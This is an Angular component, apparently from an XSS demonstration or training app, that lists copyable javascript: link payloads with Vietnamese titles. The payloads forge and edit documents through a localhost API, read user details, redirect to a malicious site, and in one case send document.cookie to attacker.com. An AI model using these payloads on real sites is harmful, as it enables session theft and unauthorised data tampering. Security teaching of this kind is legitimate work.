import { Component } from '@angular/core';
import { XssListService } from '../../services/xss-list.services';

@Component({
  selector: 'app-xss-scripts-list',
  standalone: false,
  templateUrl: './xss-scripts-list.component.html',
  styleUrl: './xss-scripts-list.component.scss'
})
export class XssScriptsListComponent {

  constructor(
    public xssListService: XssListService,
  ){}

  ngOnInit() {
    this.xssListService.hide()
  }

  readonly XssScriptlist = [
    {
      title: "Tạo tài liệu giả",
      data: `<a href="javascript:fetch('http://localhost:3000/api/documents', { method: 'POST',headers: { 'Content-Type': 'application/json' },   body: JSON.stringify({     title: 'Tài liệu giả đươc chèn vào ${Math.floor(Math.random()*1000)}',     description: '<b>Nội dung bị chèn</b>',     fileUrl: 'https://xss-test.com/fake'}) })">Tạo tài liệu Giả</a>`
    },
    {
      title: "Tạo tài liệu giả href (link XSS trong description)",
      data: `<a href="javascript:(function(){
        const payload = {
          title: 'Tài liệu XSS ' + Math.floor(Math.random() * 1000),
          description: 'Link nguy hiểm: <a href=\\'javascript:alert()\\'>Click here</a>',
          fileUrl: 'https://xss-test.com/fake'
        };
        fetch('http://localhost:3000/api/documents', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })()">Tạo tài liệu với link XSS</a>`
    },
    {
      title: "Cập nhật tiêu đề tài liệu",
      data: `<a href="javascript:fetch('http://localhost:3000/api/documents/7420', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Tiêu đề bị sửa bởi XSS' })
      })">Cập nhật tiêu đề tài liệu</a>`
    },
    {
      title: "Gọi API tạo tài liệu giả mạo",
      data: `<a href="javascript:fetch('http://localhost:3000/api/documents', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: 'Tài liệu XSS',
          description: '<b>Đây là tài liệu giả mạo</b>',
          fileUrl: 'https://xss-test.com/doc.pdf'
        })
      })">Tạo tài liệu giả</a>`
    },
    {
      title: "Lấy thông tin người dùng",
      data: `<a href="javascript:fetch('/api/users/me').then(r => r.json()).then(d => alert(JSON.stringify(d)))">Xem thông tin người dùng</a>`
    },
    {
      title: "Đánh cắp cookie",
      data: `<a href="javascript:fetch('https://attacker.com/steal?cookie=' + document.cookie)">Gửi cookie đến attacker</a>`
    },
    {
      title: "Hiển thị cookie",
      data: `<a href="javascript:alert('Cookie hiện tại: ' + document.cookie)">Xem cookie</a>`
    },    
    {
      title: "Chuyển hướng đến tài liệu nguy hiểm",
      data: `<a href="javascript:window.location.href='https://malicious-site.com/fake-doc.pdf'">Tải tài liệu giả mạo</a>`
    }
  ]

  copyText(textArea: HTMLTextAreaElement) {
    textArea.select();
    navigator.clipboard.writeText(textArea.value).then(() => {
      console.log('Copied to clipboard!');
    }).catch(err => {
      console.error('Failed to copy: ', err);
    });
  }
}
